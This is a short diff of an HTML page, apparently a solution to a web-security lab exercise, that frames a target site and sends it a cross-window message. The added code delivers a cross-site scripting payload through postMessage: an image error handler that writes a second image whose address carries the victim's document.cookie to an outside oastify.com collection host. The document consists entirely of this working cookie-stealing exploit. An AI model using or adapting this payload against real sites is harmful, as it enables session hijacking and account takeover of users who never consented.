@@ -1,12 +1,9 @@
 <html>
   <body>
-    <iframe id="frame" onload="hack()" src="http://ptl-4c50d3b3-f70a95fb.libcurl.so/"></iframe>
-    <script>
-      function hack(){
-        setTimeout(function(){
-          document.getElementById("frame").contentWindow.postMessage('user=hariharan&id=0','*');
-        }, 2000);
-      }
-    </script>
+  <iframe src="http://ptl-6e00cb6e-f5dba159.libcurl.so/" id="frame"> </iframe>
+  <script>
+    setTimeout(function(){
+      document.getElementById("frame").contentWindow.postMessage("<img src=a onerror='document.write(\"<img src=http://0fgs0qy1spejpvyw6v8lkjn3iuolce03.oastify.com/?c=\"+document.cookie+\"/>\")','*');},2000);                                                 
+  </script>
   </body>
 </html>
